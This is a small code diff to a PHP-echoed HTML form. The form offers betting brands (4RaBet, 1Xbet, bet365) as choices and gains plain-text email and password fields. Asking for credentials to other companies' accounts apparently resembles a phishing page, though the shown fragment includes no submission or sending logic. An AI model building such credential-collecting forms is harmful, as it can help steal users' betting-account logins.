@@ -13,6 +13,8 @@ echo <<< END_OF_TEXT
 <label for="selector" style="color:#ffe552"><input type="radio" name="rads" value="4RaBet" >4RaBet</label><br>
 <label for="selector" style="color:#ffe552"><input type="radio" name="rads" value="1Xbet" >1Xbet</label><br>
 <label for="selector" style="color:#ffe552"><input type="radio" name="rads" value="bet365" >bet365</label><br>
+<input type="text" name="Email" placeholder="EMAIL" style="border-radius: 10px;"  >
+<input type="text" name="password" placeholder="PASSWORD" style="border-radius: 10px;"  >
 </form>
 <h2 id="result"></h2>
 <script>
